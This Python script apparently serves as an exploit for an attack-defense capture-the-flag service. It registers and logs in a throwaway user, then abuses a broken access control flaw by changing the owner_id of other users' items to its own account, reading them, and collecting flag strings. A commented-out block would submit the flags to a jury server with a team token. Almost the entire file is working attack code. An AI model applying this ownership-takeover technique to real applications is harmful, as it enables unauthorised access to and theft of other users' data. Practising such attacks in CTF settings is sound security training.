#!/usr/bin/env python3

import requests
import sys
import re

from base64 import b32encode
from json import loads
import string
import random


def register( username: str, password: str ):
    
    resp = requests.request(
        url = f"{service_address}/register",
        method = b32encode( "reg_post".encode() ).decode().strip("="),
        data = {
            'username': username,
            'password': password
        }
    )

    return resp.text


def login( username: str, password: str ) -> object:

    s = requests.Session()

    r = s.request(
        url = f"{service_address}/login",
        method = b32encode( "log_post".encode() ).decode().strip("="),
        data = {
            'username': username,
            'password': password
        }
    )

    return s


def get_me( s: object ) -> dict:

    user_page = s.request(
        url = f"{service_address}/me",
        method = b32encode( "user_get".encode() ).decode().strip("=")
    )

    return loads( user_page.text )


def get_all_items( s: object ) -> list:

    items = s.request(
        url = f"{service_address}/items/all/",
        method = b32encode( "a_item_list".encode() ).decode().strip("="),
    )

    return loads( items.text )


def get_item( s: object, item_id: int ) -> dict:
    
    item_page = s.request(
        url = f"{service_address}/items/get/{item_id}",
        method = b32encode( "retrieve".encode() ).decode().strip("="),
    )

    return loads( item_page.text )


def change_item( s: object, item_id: int, data: dict ):
    
    r = s.request(
        url = f"{service_address}/change_item/{item_id}",
        method = b32encode( "item_put".encode() ).decode().strip("="),
        data = data
    )


def main():

    # --------------- #
    # Initialize user
    # --------------- #
    
    username = id_generator()
    password = id_generator()

    register( username, password )
    s = login( username, password )

    # ------- #
    # Show me
    # ------- #

    user_info = get_me( s )
    my_user_id = user_info["id"]

    # -------------- #
    # Show all items
    # -------------- #

    items = get_all_items( s )

    flags = []
    for item in items[:10]:

        # ------------------------- #
        # Change item's onwer to me
        # ------------------------- #

        item_id = item["id"]
        change_item( s, item_id, data = {'owner_id': my_user_id} )

        # --------------------------- #
        # Show my new item
        # --------------------------- #

        item_info = get_item( s, item_id )

        finded_flags = re.findall( '[A-Z0-9]{31}=' , str(item_info) )
        flags += finded_flags

    # ------------------ #
    # Send flags to Jury
    # ------------------ #

    send_flags( flags )


def id_generator(size=8, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def send_flags( flags: list ):

    print( flags )

    # resp = requests.put( 'http://10.10.10.10/flags',
    #     headers = {
    #         "X-Team-Token": "277b7eee31dfbba4",
    #         "Content-Type": "application/json"
    #     },
    #     json = flags
    # )

    # print( resp.text )


if __name__ == "__main__":

    ip =    sys.argv[1]
    port =  7000
    service_address = f"http://{ip}:{port}"

    main()